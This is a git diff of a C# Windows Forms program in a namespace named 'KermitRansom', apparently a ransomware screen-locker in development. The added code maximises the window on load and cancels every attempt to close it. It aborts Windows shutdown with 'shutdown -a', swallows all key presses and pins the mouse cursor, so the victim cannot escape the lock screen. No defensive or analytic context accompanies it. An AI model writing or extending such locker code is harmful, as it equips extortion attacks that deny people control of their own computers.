@@ -11,6 +11,7 @@ using System.IO;
 using System.Threading;
 using System.Diagnostics;
 using System.Reflection;
+using System.Runtime.InteropServices;
 
 namespace KermitRansom
 {
@@ -21,12 +22,40 @@ namespace KermitRansom
             InitializeComponent();
         }
 
+        [DllImport("user32.dll")]
+        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData,
+        UIntPtr dwExtraInfo);
+
         private void Form1_Load(object sender, EventArgs e)
         {
-            String File = Path.GetDirectoryName(Assembly.GetExecutingAssembly().GetName().CodeBase);
-            Thread.Sleep(100);
-            Process.Start(fileName: File);
-            Close();
+           if (this.WindowState != FormWindowState.Maximized)
+            {
+                this.WindowState = FormWindowState.Maximized;
+            } 
+        }
+        private void StopShutdown(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+            if(e.CloseReason == CloseReason.WindowsShutDown)
+            {
+                Process.Start("shutdown", " -a");
+            }
+            else if(e.CloseReason == CloseReason.TaskManagerClosing)
+            {
+
+            }
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void KeyPressAction(object sender, KeyEventArgs e)
+        {
+            e.SuppressKeyPress = true;
+            Cursor.Position = new Point(1000, 0);
+            
         }
     }
 }
